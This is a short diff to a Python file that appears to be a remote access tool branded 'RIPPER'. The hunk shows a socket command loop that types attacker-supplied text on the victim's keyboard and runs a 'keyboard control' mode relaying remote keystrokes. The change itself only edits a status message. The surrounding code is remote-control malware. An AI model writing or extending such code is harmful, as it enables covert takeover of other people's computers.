@@ -126,7 +126,7 @@ def connect():
                 keyboard.write(f'{command[14:]}');
                 s.send(f"[RIPPER]  {command[14:]} Was entered successfully".encode('utf-8', errors='ignore'));
             elif command.startswith('keyboard control'):
-                s.send(f"[RIPPER]  Are you controlling the keyboard now".encode('utf-8', errors='ignore'));
+                s.send(f"[RIPPER]  Are you controlling the keyboard now, press insert to stop.".encode('utf-8', errors='ignore'));
                 while True:
                     key = s.recv(1024).decode('utf-8');
                     key = key.replace("'","");
